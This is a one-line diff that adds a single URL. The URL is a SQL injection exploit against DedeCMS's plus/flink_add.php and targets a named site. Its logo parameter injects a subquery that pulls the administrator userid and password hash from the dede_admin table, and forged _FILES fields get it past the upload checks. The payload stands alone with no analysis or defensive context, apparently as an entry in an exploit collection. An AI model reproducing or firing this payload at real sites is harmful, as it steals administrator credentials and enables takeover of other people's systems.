@@ -1,0 +1,1 @@
+http://adux.me/dedecms/plus/flink_add.php?Submit=%20%E6%8F%90%20%E4%BA%A4%20&dopost=save&email=&logo=,if(@`%27`,0x7c,(select%20concat(userid,0x7c,pwd)%20from%20dede_admin%20limit%200,1)),1,1,1,1,1)#,@`'`&typeid=1&url=http%3A%2F%2F&validate=bgfs&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\
